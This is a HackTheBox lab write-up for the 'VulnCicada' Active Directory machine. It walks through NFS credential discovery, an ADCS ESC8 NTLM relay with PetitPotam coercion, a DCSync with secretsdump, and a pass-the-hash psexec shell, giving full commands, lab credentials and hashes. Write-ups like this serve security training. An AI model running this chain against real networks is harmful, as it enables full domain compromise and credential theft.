---
title: "HTB - VulnCicada (Medium | Windows | Active Directory)"
date: 2026-09-15 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, nfs, adcs, esc8, relay-attack, dcsync-attack, petitpotam, nxc, certipy, bloodyad, secretsdump, psexec]
description: "NFS-leaked credentials, then ADCS ESC8 NTLM relay via PetitPotam to DCSync the domain"
image:
  path: /assets/img/vulncicada.png
---

## **Recon**

```bash
nmap -p- -sC -sV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-15 11:08:03Z)
111/tcp   open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-15T10:57:26
|_Not valid after:  2027-09-15T10:57:26
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-15T10:57:26
|_Not valid after:  2027-09-15T10:57:26
2049/tcp  open  nfs           2-4 (RPC #100003)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-15T10:57:26
|_Not valid after:  2027-09-15T10:57:26
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-15T10:57:26
|_Not valid after:  2027-09-15T10:57:26
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-09-14T11:05:02
|_Not valid after:  2027-03-16T11:05:02
|_ssl-date: 2026-09-15T11:09:46+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
51884/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51885/tcp open  msrpc         Microsoft Windows RPC
56708/tcp open  msrpc         Microsoft Windows RPC
65074/tcp open  msrpc         Microsoft Windows RPC
65528/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-15T11:09:10
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **DNS (Port 53):** Simple DNS Plus
- **HTTP (Port 80):** Microsoft IIS 10.0
- **Kerberos (Port 88):** Microsoft Windows Kerberos
- **RPC (Port 111, 135, 593):** Various RPC endpoints
- **SMB (Port 139, 445):** Microsoft Windows file sharing
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **NFS (Port 2049):** Network File System
- **RDP (Port 3389):** Remote Desktop Protocol
- **WinRM (Port 5985):** Windows Remote Management

The domain is identified as cicada.vl with hostname DC-JPQ225.cicada.vl. The presence of NFS is particularly notable as it may allow unauthenticated file access.

### NFS Enumeration

Enumerate NFS shares on the target:

```bash
showmount -e <target>
```

```
Export list for <target>:
/profiles (everyone)
```

The `/profiles` share is accessible to everyone. Mount the NFS share on the attacker's machine:

```bash
mkdir ./mnt
sudo mount -t nfs -o nolock <target>:/profiles ./mnt
```

![](/assets/img/vulncicada/Pasted_image_20260913192218.png)

Investigating the mounted share reveals several user profile directories. The user Rosie.Powell has interesting files including a photo and a documents folder.

![](/assets/img/vulncicada/Pasted_image_20260913192859.png)

Within the photo, a notepad window is visible containing a potential password: **Cicada123**

### Credential Validation

Verify the discovered credentials using netexec:

```bash
nxc smb <target> -u Rosie.Powell -p 'Cicada123' --kerberos
```

![](/assets/img/vulncicada/Pasted_image_20260913194507.png)

The credentials are successfully validated. Rosie.Powell can authenticate to the domain.

---

## **User**

### ADCS Vulnerability Enumeration

Use certipy to search for vulnerable certificate templates:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p 'Cicada123' -vulnerable -stdout -k
```

```
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

![](/assets/img/vulncicada/Pasted_image_20260913195154.png)

The target is vulnerable to ESC8 (Enrollment Server over HTTP). This vulnerability allows relay attacks against the ADCS web enrollment interface.

### ESC8 Exploitation - NTLM Relay Attack

#### Step 1: Set Up Certipy Relay Listener

Start a relay server that will capture authentication attempts and request a certificate for the Domain Controller:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -timeout 90
```

![](/assets/img/vulncicada/Pasted_image_20260913203837.png)

The relay server is now listening for incoming authentication attempts.

#### Step 2: Force Domain Controller Authentication

Use BloodyAD to add a DNS record pointing to the attacker's machine, forcing the Domain Controller to authenticate:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host DC-JPQ225.cicada.vl -d cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <attacker_ip>
```

![](/assets/img/vulncicada/Pasted_image_20260913200409.png)

#### Step 3: Trigger PetitPotam Coercion

Use netexec to coerce the Domain Controller to authenticate via PetitPotam:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

![](/assets/img/vulncicada/Pasted_image_20260913203853.png)

The Domain Controller is coerced to authenticate to the attacker's IP address.

#### Step 4: Certificate Generation

The relay server captures the authentication attempt and automatically requests a certificate for the Domain Controller:

![](/assets/img/vulncicada/Pasted_image_20260913203935.png)

A DomainController certificate (dc-jpq225.pfx) is successfully generated.

---

## **Root**

### Extract NT Hash from Certificate

Use certipy to authenticate with the obtained certificate and extract the Domain Controller's NT hash (unpac-the-hash):

```bash
certipy auth -pfx dc-jpq225.pfx -dc-ip <target>
```

```
[*] Got hash for 'dc-jpq225$@cicada.vl':
aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

The Domain Controller's NT hash is extracted and can be used for further attacks.

### DCSync Attack

Use the Domain Controller's hash to perform a DCSync attack, extracting all domain user hashes:

```bash
secretsdump.py -hashes :a65952c664e9cf5de60195626edbeee3 -k -dc-ip <target> 'cicada.vl/DC-JPQ225$'@DC-JPQ225.cicada.vl
```

![](/assets/img/vulncicada/Pasted_image_20260913204801.png)

The Administrator's NT hash is extracted:

**Administrator NT Hash:** `85a0da53871a9d56b6cd05deda3a5e87`

### Authenticate as Administrator

Use PsExec to authenticate as the Administrator using the extracted hash:

```bash
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```

An interactive shell is established with Administrator privileges on the Domain Controller.

### Retrieve Flags

With Administrator access, retrieve both the user and root flags:

```powershell
type user.txt
type root.txt
```

![](/assets/img/vulncicada/Pasted_image_20260913205224.png)

Both flags are successfully retrieved, completing the compromise of the target system.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap scan identified Active Directory infrastructure with multiple services including DNS, Kerberos, LDAP, NFS, and ADCS
2. **NFS Enumeration:** Mounted unauthenticated NFS share `/profiles` and discovered user profile directories
3. **Credential Discovery:** Found Rosie.Powell's password (Cicada123) visible in a photo within the NFS share
4. **ADCS Vulnerability:** Identified ESC8 vulnerability - Web Enrollment enabled over HTTP
5. **Relay Attack:** Set up certipy relay listener to capture NTLM authentication attempts
6. **DNS Manipulation:** Used BloodyAD to add malicious DNS record forcing Domain Controller authentication
7. **PetitPotam Coercion:** Triggered Domain Controller authentication via PetitPotam coercion
8. **Certificate Capture:** Relay attack captured authentication and generated DomainController certificate
9. **Hash Extraction:** Used certificate to extract Domain Controller NT hash via unpac-the-hash
10. **DCSync Attack:** Performed DCSync with Domain Controller hash to extract Administrator credentials
11. **Full Compromise:** Authenticated as Administrator and retrieved both user and root flags